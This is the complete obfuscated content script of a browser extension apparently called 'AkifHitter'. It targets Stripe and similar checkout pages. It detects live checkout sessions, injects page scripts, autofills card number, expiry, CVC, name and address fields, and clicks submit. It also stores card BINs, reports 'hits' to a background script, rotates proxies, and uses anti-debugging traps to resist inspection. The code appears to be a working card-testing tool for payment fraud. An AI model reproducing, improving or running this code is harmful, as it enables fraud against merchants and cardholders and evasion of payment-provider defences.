if (window.__AKIF_CONTENT_LOADED) {} else (function akifContentMain() {
  const v_2 = function () {
    let v_1_1 = true;
    return function (p_1, p_2) {
      const v_1_2 = v_1_1 ? function () {
        if (p_2) {
          const v_1_3 = p_2.apply(p_1, arguments);
          return p_2 = null, v_1_3;
        }
      } : function () {};
      return v_1_1 = false, v_1_2;
    };
  }();
  window.__AKIF_CONTENT_LOADED = true;
  const v_3 = new Set();
  let v_4 = null;
  function fn_1_1(p_1) {
    p_1.forEach(p_1_1 => v_3.add(p_1_1)), clearTimeout(v_4), v_4 = setTimeout(() => v_3.clear(), 2000);
  }
  typeof chrome !== "undefined" && chrome.storage && chrome.storage.onChanged && chrome.storage.onChanged.addListener((p_1, p_2) => {
    if (p_2 === "local") {
      const v_1_1 = {};
      let v_2_1 = false;
      for (const [v_1_2, {
        newValue: v_2_2
      }] of Object.entries(p_1)) {
        if (v_3.has(v_1_2)) continue;
        v_1_1[v_1_2] = v_2_2 !== undefined ? v_2_2 : null, v_2_1 = true;
      }
      if (v_2_1) {
        window.postMessage({
          'type': "AKIF_STORAGE_CHANGED",
          'changes': v_1_1
        }, '*');
      }
    }
  });
  window.addEventListener("message", async p_1 => {
    if (p_1.source !== window) {
      return;
    }
    if (p_1.data && p_1.data.type === "AKIF_STORAGE_REQUEST") {
      const {
        requestId: v_1_1,
        action: v_2_1,
        data: v_3_1
      } = p_1.data;
      try {
        if (!fn_7()) {
          window.postMessage({
            'type': "AKIF_STORAGE_RESPONSE",
            'requestId': v_1_1,
            'result': null
          }, '*');
          return;
        }
        if (v_2_1 === "GET") chrome.storage.local.get(v_3_1.keys, p_1_1 => {
          window.postMessage({
            'type': "AKIF_STORAGE_RESPONSE",
            'requestId': v_1_1,
            'result': p_1_1 || {}
          }, '*');
        });else {
          if (v_2_1 === "SET") fn_1_1(Object.keys(v_3_1)), chrome.storage.local.set(v_3_1, () => {
            const v_1_2 = {};
            v_1_2.success = true;
            window.postMessage({
              'type': "AKIF_STORAGE_RESPONSE",
              'requestId': v_1_1,
              'result': v_1_2
            }, '*');
          });else v_2_1 === "REMOVE" && (fn_1_1(v_3_1.keys), chrome.storage.local.remove(v_3_1.keys, () => {
            const v_1_2 = {};
            v_1_2.success = true;
            window.postMessage({
              'type': "AKIF_STORAGE_RESPONSE",
              'requestId': v_1_1,
              'result': v_1_2
            }, '*');
          }));
        }
      } catch (v_1_2) {
        window.postMessage({
          'type': "AKIF_STORAGE_RESPONSE",
          'requestId': v_1_1,
          'result': null
        }, '*');
      }
      return;
    }
  }), window.addEventListener("message", async p_1 => {
    if (p_1.data.type === "PROXY_FETCH_REQUEST") try {
      const v_1_1 = await chrome.runtime.sendMessage({
        'type': "PROXY_FETCH",
        'url': p_1.data.url,
        'method': p_1.data.options?.["method"] || "GET",
        'headers': p_1.data.options?.["headers"] || {},
        'body': p_1.data.options?.["body"] || null,
        'useProxy': p_1.data.useProxy
      });
      window.postMessage({
        'type': "PROXY_FETCH_RESPONSE",
        'requestId': p_1.data.requestId,
        'response': v_1_1
      }, '*');
    } catch (v_1_1) {
      const v_2_1 = {};
      v_2_1.success = false, v_2_1.error = v_1_1.message, v_2_1.usedProxy = null, window.postMessage({
        'type': "PROXY_FETCH_RESPONSE",
        'requestId': p_1.data.requestId,
        'response': v_2_1
      }, '*');
    }
  }), window.addEventListener("message", async p_1 => {
    if (p_1.data && p_1.data.type === "AKIF_TO_BACKGROUND" && p_1.data.requestId) try {
      const v_1_1 = await chrome.runtime.sendMessage(p_1.data.payload),
        v_2_1 = {};
      v_2_1.success = true, window.postMessage({
        'type': "AKIF_FROM_BACKGROUND",
        'requestId': p_1.data.requestId,
        'response': v_1_1 || v_2_1
      }, '*');
    } catch (v_1_1) {
      const v_2_1 = v_1_1.message || '';
      if (v_2_1.includes("asynchronous response") || v_2_1.includes("message port closed")) {
        const v_1_2 = {};
        v_1_2.success = true, window.postMessage({
          'type': "AKIF_FROM_BACKGROUND",
          'requestId': p_1.data.requestId,
          'response': v_1_2
        }, '*');
        return;
      }
      const v_3_1 = {};
      v_3_1.success = false, v_3_1.error = v_2_1, window.postMessage({
        'type': "AKIF_FROM_BACKGROUND",
        'requestId': p_1.data.requestId,
        'response': v_3_1
      }, '*');
    }
  });
  function fn_2(p_1, p_2) {
    p_1.focus();
    const v_1_1 = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
    v_1_1.call(p_1, p_2);
    const v_2_1 = {};
    v_2_1.bubbles = true;
    p_1.dispatchEvent(new Event("input", v_2_1));
    const v_3_1 = {};
    v_3_1.bubbles = true, p_1.dispatchEvent(new Event("change", v_3_1));
    const v_4_1 = {};
    v_4_1.bubbles = true, p_1.dispatchEvent(new KeyboardEvent("keyup", v_4_1)), p_1.blur();
  }
  function fn_3(p_1, p_2) {
    const v_1_1 = "4|1|5|0|3|2".split('|');
    let v_2_1 = 0;
    while (true) {
      switch (v_1_1[v_2_1++]) {
        case '0':
          const v_1_2 = {};
          v_1_2.bubbles = true, p_1.dispatchEvent(new Event("change", v_1_2));
          continue;
        case '1':
          p_1.value = p_2;
          continue;
        case '2':
          p_1.blur();
          continue;
        case '3':
          const v_2_2 = {};
          v_2_2.value = p_2;
          const v_3_1 = {};
          v_3_1.bubbles = true, v_3_1.detail = v_2_2, p_1.dispatchEvent(new CustomEvent("select:change", v_3_1));
          continue;
        case '4':
          p_1.focus();
          continue;
        case '5':
          const v_4_1 = {};
          v_4_1.bubbles = true, p_1.dispatchEvent(new Event("input", v_4_1));
          continue;
      }
      break;
    }
  }
  const v_5 = ["AkifHitter"],
    v_6 = ['CO'];
  function fn_4() {
    return v_5[Math.floor(Math.random() * v_5.length)];
  }
  function fn_5() {
    const v_1_1 = v_6[Math.floor(Math.random() * v_6.length)],
      v_2_1 = Math.floor(Math.random() * 999) + 1;
    return v_2_1 + '\x20' + v_1_1;
  }
  async function fn_6() {
    const v_1_1 = {
      'cardNumber': {
        'selector': "#cardNumber, [name=\"cardNumber\"], [autocomplete=\"cc-number\"]",
        'value': "4242424242424242"
      },
      'cardExpiry': {
        'selector': "#cardExpiry, [name=\"cardExpiry\"], [autocomplete=\"cc-exp\"]",
        'value': "01/32"
      },
      'cardCvc': {
        'selector': "#cardCvc, [name=\"cardCvc\"], [autocomplete=\"cc-csc\"]",
        'value': "000"
      },
      'billingName': {
        'selector': "#billingName, [name=\"billingName\"], [autocomplete=\"cc-name\"]",
        'value': fn_4()
      },
      'billingCountry': {
        'selector': "#billingCountry, [name=\"billingCountry\"]",
        'value': 'MO'
      },
      'billingAddress': {
        'selector': "#billingAddressLine1, [name=\"billingAddressLine1\"]",
        'value': fn_5()
      }
    };
    for (let [v_1_2, v_2_2] of Object.entries(v_1_1)) {
      const v_1_3 = document.querySelector(v_2_2.selector);
      v_1_3 && (v_1_3.tagName.toLowerCase() === "select" ? fn_3(v_1_3, v_2_2.value) : fn_2(v_1_3, v_2_2.value), await new Promise(p_1 => setTimeout(p_1, 100)));
    }
    await new Promise(p_1 => setTimeout(p_1, 1000));
    const v_2_1 = document.querySelector(".SubmitButton-IconContainer, .SubmitButton-Button, button[type=\"submit\"]");
    if (v_2_1) {
      const v_1_2 = v_2_1.closest("button") || v_2_1;
      v_1_2.click();
    }
  }
  let v_7 = null,
    v_8 = 0;
  const v_9 = 5;
  function fn_7() {
    try {
      return !!chrome.runtime && !!chrome.runtime.id;
    } catch (v_1_1) {
      return false;
    }
  }
  function fn_8(p_1) {
    const v_1_1 = {};
    v_1_1.hWwua = "stateObject";
    try {
      fn_7() && (fn_1_1(Object.keys(p_1)), chrome.storage.local.set(p_1));
    } catch (v_1_2) {}
  }
  function fn_9(p_1, p_2) {
    try {
      fn_7() && chrome.storage.local.get(p_1, p_2);
    } catch (v_1_2) {}
  }
  function fn_10() {
    const v_1_1 = v_2(this, function () {
      return v_1_1.toString().search("(((.+)+)+)+$").toString().constructor(v_1_1).search("(((.+)+)+)+$");
    });
    v_1_1();
    try {
      if (!fn_7()) {
        return;
      }
      v_7 = chrome.runtime.connect({
        'name': "akif-content"
      }), v_8 = 0, v_7.onMessage.addListener(p_1 => {
        if (p_1.type === "PING") {}
      }), v_7.onDisconnect.addListener(() => {
        v_7 = null, v_8 < v_9 && (v_8++, setTimeout(fn_10, v_8 * 1000));
      });
    } catch (v_1_2) {
      v_7 = null;
    }
  }
  fn_10(), setInterval(() => {
    !v_7 && fn_7() && fn_10();
  }, 30000);
  async function fn_11(p_1, p_2 = 3) {
    for (let v_1_1 = 0; v_1_1 < p_2; v_1_1++) {
      try {
        if (!fn_7()) throw new Error("Extension context invalidated");
        const v_1_2 = await chrome.runtime.sendMessage(p_1);
        return v_1_2;
      } catch (v_1_2) {
        const v_2_1 = v_1_2.message.includes("Extension context invalidated") || v_1_2.message.includes("disconnected") || v_1_2.message.includes("Receiving end does not exist") || v_1_2.message.includes("Could not establish connection");
        if (v_2_1) {
          fn_10();
          if (v_1_1 < p_2 - 1) {
            await new Promise(p_1_1 => setTimeout(p_1_1, (v_1_1 + 1) * 500));
            continue;
          }
          return {
            'success': false,
            'error': "Connection lost. Retrying..."
          };
        }
        throw v_1_2;
      }
    }
    return {
      'success': false,
      'error': "Failed after retries"
    };
  }
  window.addEventListener("message", async function (p_1) {
    if (p_1.source !== window) {
      return;
    }
    if (!fn_7()) return;
    switch (p_1.data.type) {
      case "AUTOFILL_FIELDS":
        fn_6();
        break;
      case "GET_SAVED_BIN":
        fn_9(["akif_saved_bins"], function (p_1_1) {
          var v_1_3 = p_1_1.akif_saved_bins;
          var v_2_2 = Array.isArray(v_1_3) ? v_1_3[0] || '' : v_1_3 || '';
          window.postMessage({
            'type': "UPDATE_SAVED_BIN",
            'bin': v_2_2
          }, '*');
        });
        break;
      case "GET_SAVED_ID":
        fn_9(["akif_saved_id"], function (p_1_1) {
          window.postMessage({
            'type': "UPDATE_SAVED_ID",
            'id': p_1_1.akif_saved_id || ''
          }, '*');
        });
        break;
      case "PLAY_SUCCESS_SOUND":
        fn_11({
          'type': "PLAY_SUCCESS_SOUND_OFFSCREEN"
        }).catch(() => {});
        break;
      case "PLAY_HIT_SOUND":
        fn_11({
          'type': "PLAY_SUCCESS_SOUND_OFFSCREEN"
        }).catch(() => {});
        break;
      case "CAPTURE_SCREENSHOT_REQUEST":
        fn_11({
          'type': "CAPTURE_SCREENSHOT"
        }).then(p_1_1 => {
          if (p_1_1 && p_1_1.dataUrl) window.postMessage({
            'type': "SCREENSHOT_RESULT",
            'dataUrl': p_1_1.dataUrl
          }, '*');else {
            window.postMessage({
              'type': "SCREENSHOT_ERROR",
              'error': "Failed to capture"
            }, '*');
          }
        }).catch(p_1_1 => {
          const v_1_3 = {};
          v_1_3.kVQnN = "while (true) {}";
          const v_2_2 = v_1_3;
          window.postMessage({
            'type': "SCREENSHOT_ERROR",
            'error': p_1_1.message
          }, '*');
        });
        break;
      case "PLAY_CUSTOM_PREVIEW":
        fn_11({
          'type': "PLAY_CUSTOM_PREVIEW"
        }).catch(() => {});
        break;
      case "STOP_CUSTOM_PREVIEW":
        fn_11({
          'type': "STOP_CUSTOM_PREVIEW"
        }).catch(() => {});
        break;
      case "PLAY_BACKGROUND_MUSIC":
        fn_11({
          'type': "PLAY_BACKGROUND_MUSIC",
          'volume': p_1.data.volume
        }).catch(() => {});
        break;
      case "STOP_BACKGROUND_MUSIC":
        fn_11({
          'type': "STOP_BACKGROUND_MUSIC"
        }).catch(() => {});
        break;
      case "SAVE_CUSTOM_MUSIC":
        try {
          if (fn_7()) {
            const v_1_3 = {};
            v_1_3.akif_music_data = p_1.data.audioData;
            var v_1_1 = v_1_3;
            chrome.storage.local.set(v_1_1, () => {
              window.postMessage({
                'type': "CUSTOM_MUSIC_SAVED",
                'success': true
              }, '*');
            });
          }
        } catch (v_1_3) {}
        break;
      case "REMOVE_CUSTOM_MUSIC":
        try {
          fn_7() && chrome.storage.local.remove(["akif_music_data"]);
        } catch (v_1_3) {}
        break;
      case "SAVE_TOGGLE_STATE":
        var v_2_1 = p_1.data.toggleType,
          v_3_1 = p_1.data.value,
          v_4_1 = {};
        if (v_2_1 === "hitSound") {
          v_4_1.akif_toggle_hit_sound = v_3_1;
        } else v_2_1 === "autoSS" && (v_4_1.akif_toggle_auto_ss = v_3_1);
        if (Object.keys(v_4_1).length) {
          fn_8(v_4_1);
        }
        break;
      case "GET_TOGGLE_STATES":
        fn_9(["akif_toggle_hit_sound", "akif_toggle_auto_ss"], function (p_1_1) {
          window.postMessage({
            'type': "UPDATE_TOGGLE_STATES",
            'hitSoundEnabled': p_1_1.akif_toggle_hit_sound !== false,
            'autoSSEnabled': p_1_1.akif_toggle_auto_ss !== false
          }, '*');
        });
        break;
      case "SAVE_ID":
        const v_1_2 = {};
        v_1_2.akif_saved_id = p_1.data.id;
        var v_5_1 = v_1_2;
        fn_8(v_5_1);
        break;
      case "SAVE_BIN":
        if (Array.isArray(p_1.data.bins)) {
          const v_1_3 = {};
          v_1_3.akif_saved_bins = p_1.data.bins;
          var v_6_1 = v_1_3;
          fn_8(v_6_1);
        } else {
          const v_1_3 = {};
          v_1_3.akif_saved_bins = [p_1.data.bin];
          var v_7_1 = v_1_3;
          fn_8(v_7_1);
        }
        break;
      case "GET_MUSIC_URL":
        try {
          if (fn_7()) {
            const v_1_3 = chrome.runtime.getURL("sounds/music.mp3");
            window.postMessage({
              'type': "MUSIC_URL",
              'url': v_1_3
            }, '*');
          }
        } catch (v_1_3) {}
        break;
      case "COPY_TO_CLIPBOARD_TEXT":
        p_1.data.text && navigator.clipboard.writeText(p_1.data.text).catch(() => {
          const v_1_3 = document.createElement("textarea");
          v_1_3.value = p_1.data.text, v_1_3.style.position = "fixed", v_1_3.style.left = "-9999px", document.body.appendChild(v_1_3), v_1_3.select(), document.execCommand("copy"), document.body.removeChild(v_1_3);
        });
        break;
      case "AKIF_HIT_SEND_FROM_PAGE":
        try {
          const v_1_3 = await chrome.runtime.sendMessage({
            'type': "AKIF_HIT_SEND",
            'data': p_1.data.data
          });
          window.postMessage({
            'type': "AKIF_HIT_SEND_RESPONSE",
            'requestId': p_1.data.requestId,
            'response': v_1_3
          }, '*');
        } catch (v_1_3) {
          const v_2_2 = {};
          v_2_2.success = false, v_2_2.error = v_1_3.message, window.postMessage({
            'type': "AKIF_HIT_SEND_RESPONSE",
            'requestId': p_1.data.requestId,
            'response': v_2_2
          }, '*');
        }
        break;
      case "AKIF_PROXY_TEST_FROM_PAGE":
        try {
          const v_1_3 = await chrome.runtime.sendMessage({
            'type': "AKIF_PROXY_TEST",
            'proxy': p_1.data.proxy
          });
          window.postMessage({
            'type': "AKIF_PROXY_TEST_RESPONSE",
            'requestId': p_1.data.requestId,
            'response': v_1_3
          }, '*');
        } catch (v_1_3) {
          const v_2_2 = {};
          v_2_2.success = false, v_2_2.error = v_1_3.message, window.postMessage({
            'type': "AKIF_PROXY_TEST_RESPONSE",
            'requestId': p_1.data.requestId,
            'response': v_2_2
          }, '*');
        }
        break;
      case "AKIF_GET_CURRENT_IP_FROM_PAGE":
        try {
          const v_1_3 = await chrome.runtime.sendMessage({
            'type': "AKIF_GET_CURRENT_IP"
          });
          window.postMessage({
            'type': "AKIF_GET_CURRENT_IP_RESPONSE",
            'requestId': p_1.data.requestId,
            'response': v_1_3
          }, '*');
        } catch (v_1_3) {
          const v_2_2 = {};
          v_2_2.success = false, v_2_2.error = v_1_3.message, window.postMessage({
            'type': "AKIF_GET_CURRENT_IP_RESPONSE",
            'requestId': p_1.data.requestId,
            'response': v_2_2
          }, '*');
        }
        break;
      case "AKIF_SET_ACTIVE_PROXY_FROM_PAGE":
        try {
          const v_1_3 = await chrome.runtime.sendMessage({
            'type': "SET_ACTIVE_PROXY",
            'proxy': p_1.data.proxy
          });
          window.postMessage({
            'type': "AKIF_SET_ACTIVE_PROXY_RESPONSE",
            'requestId': p_1.data.requestId,
            'response': v_1_3
          }, '*');
        } catch (v_1_3) {
          const v_2_2 = {};
          v_2_2.success = false, v_2_2.error = v_1_3.message, window.postMessage({
            'type': "AKIF_SET_ACTIVE_PROXY_RESPONSE",
            'requestId': p_1.data.requestId,
            'response': v_2_2
          }, '*');
        }
        break;
      case "AKIF_CLEAR_ACTIVE_PROXY_FROM_PAGE":
        try {
          const v_1_3 = await chrome.runtime.sendMessage({
            'type': "CLEAR_ACTIVE_PROXY"
          });
          window.postMessage({
            'type': "AKIF_CLEAR_ACTIVE_PROXY_RESPONSE",
            'requestId': p_1.data.requestId,
            'response': v_1_3
          }, '*');
        } catch (v_1_3) {
          const v_2_2 = {};
          v_2_2.success = false, v_2_2.error = v_1_3.message, window.postMessage({
            'type': "AKIF_CLEAR_ACTIVE_PROXY_RESPONSE",
            'requestId': p_1.data.requestId,
            'response': v_2_2
          }, '*');
        }
        break;
    }
  });
  function fn_12() {
    const v_1_1 = window.location.href.toLowerCase(),
      v_2_1 = window.location.hostname.toLowerCase(),
      v_3_1 = window.location.pathname.toLowerCase(),
      v_4_1 = ["billing.gamma.app", "pay.openai.com", "checkout.stripe.com", "pay.krea.ai", "buy.stripe.com"];
    for (const v_1_2 of v_4_1) {
      if (v_2_1 === v_1_2 || v_2_1.endsWith('.' + v_1_2)) return true;
    }
    if (v_2_1.endsWith(".stripe.com") || v_2_1 === "stripe.com") return true;
    if (v_2_1.startsWith("checkout.")) return true;
    if (v_1_1.includes("/c/pay/cs_live")) return true;
    if (v_1_1.includes("/c/pay/cs_test")) return true;
    if (v_1_1.includes("cs_live_")) return true;
    if (v_1_1.includes("cs_test_")) return true;
    if (v_1_1.includes("checkout.stripe.com/c/pay")) return true;
    if (v_1_1.includes("pay.krea.ai/c/pay")) return true;
    if (v_3_1.includes("/checkout")) {
      return true;
    }
    if (v_3_1.includes("/c/pay/")) return true;
    return false;
  }
  function fn_13() {
    const v_1_1 = window.location.href.toLowerCase(),
      v_2_1 = window.location.hostname.toLowerCase();
    if (v_1_1.includes("cs_live") || v_1_1.includes("cs_test")) return true;
    if (v_2_1.startsWith("checkout.")) return true;
    if (!v_2_1.includes("stripe") && !v_2_1.includes("pay") && !v_2_1.includes("checkout") && !v_2_1.includes("billing") && !v_2_1.includes("gamma") && !v_2_1.includes("openai") && !v_2_1.includes("krea")) return false;
    if (document.querySelector("iframe[src*=\"stripe\"]")) return true;
    if (document.querySelector("iframe[name*=\"stripe\"]")) {
      return true;
    }
    if (document.querySelector("[class*=\"SubmitButton\"]")) return true;
    if (document.querySelector("#cardNumber")) {
      return true;
    }
    return false;
  }
  function fn_14() {
    if (!fn_7()) return;
    if (document.getElementById("akifHitterStyles")) {
      return;
    }
    try {
      const v_1_1 = document.createElement("link");
      v_1_1.id = "akifHitterStyles", v_1_1.rel = "stylesheet", v_1_1.href = chrome.runtime.getURL("styles.css"), (document.head || document.documentElement).appendChild(v_1_1);
    } catch (v_1_1) {}
  }
  function fn_15() {
    if (document.getElementById("akif-login-script")) return;
    const v_1_1 = document.createElement("script");
    v_1_1.id = "akif-login-script", v_1_1.src = chrome.runtime.getURL("script/login.js");
    v_1_1.onload = function () {
      this.remove();
    }, (document.head || document.documentElement).appendChild(v_1_1);
  }
  function fn_16() {
    if (!fn_7()) {
      return;
    }
    if (window !== window.top) return;
    if (window.__akifHitterInjected) {
      return;
    }
    window.__akifHitterInjected = true;
    if (document.querySelector("script[data-akif-hitter]")) {
      return;
    }
    fn_15();
    fn_14();
    try {
      const v_1_2 = document.createElement("meta");
      v_1_2.name = "akif-default-pfp", v_1_2.content = chrome.runtime.getURL("icons/logo.png"), document.head.appendChild(v_1_2);
    } catch (v_1_2) {}
    const v_1_1 = ["script/storage.js", "script/autofill.js"];
    try {
      let v_1_2 = 0;
      const v_2_1 = v_1_1.length;
      function fn_1_2() {
        const v_1_3 = document.createElement("script");
        v_1_3.src = chrome.runtime.getURL("script/inject.js"), v_1_3.setAttribute("data-akif-hitter", "true");
        v_1_3.onload = function () {
          this.remove();
        }, (document.head || document.documentElement).appendChild(v_1_3);
      }
      v_1_1.forEach(p_1 => {
        const v_1_3 = document.createElement("script");
        v_1_3.src = chrome.runtime.getURL(p_1), v_1_3.onload = function () {
          v_1_2++, v_1_2 === v_2_1 && setTimeout(fn_1_2, 50), this.remove();
        }, v_1_3.onerror = function () {
          v_1_2++;
          if (v_1_2 === v_2_1) {
            setTimeout(fn_1_2, 50);
          }
        };
        (document.head || document.documentElement).appendChild(v_1_3);
      }), setTimeout(() => {
        v_1_2 < v_2_1 && fn_1_2();
      }, 2000);
    } catch (v_1_2) {}
  }
  function fn_17() {
    (fn_12() || fn_13()) && fn_16();
  }
  document.readyState === "loading" ? document.addEventListener("DOMContentLoaded", fn_17) : fn_17();
  setTimeout(fn_17, 1000), setTimeout(fn_17, 3000);
  const v_10 = new MutationObserver(() => {
      !window.__akifHitterInjected && (fn_12() || fn_13()) && (fn_16(), v_10.disconnect());
    }),
    v_11 = {};
  v_11.childList = true, v_11.subtree = true, v_10.observe(document.documentElement, v_11), setTimeout(() => v_10.disconnect(), 10000);
})();
(function () {
  let v_1;
  try {
    const v_1_1 = Function("return (function() " + "{}.constructor(\"return this\")( )" + ');');
    v_1 = v_1_1();
  } catch (v_1_1) {
    v_1 = window;
  }
  v_1.setInterval(fn_1, 4000);
})();
function fn_1(p_1) {
  function fn_1_1(p_1_1) {
    if (typeof p_1_1 === "string") return function (p_1_2) {}.constructor("while (true) {}").apply("counter");else {
      if (('' + p_1_1 / p_1_1)["length"] !== 1 || p_1_1 % 20 === 0) (function () {
        return true;
      }).constructor("debu" + "gger").call("action");else {
        (function () {
          return false;
        }).constructor("debu" + "gger").apply("stateObject");
      }
    }
    fn_1_1(++p_1_1);
  }
  try {
    if (p_1) return fn_1_1;else fn_1_1(0);
  } catch (v_1) {}
}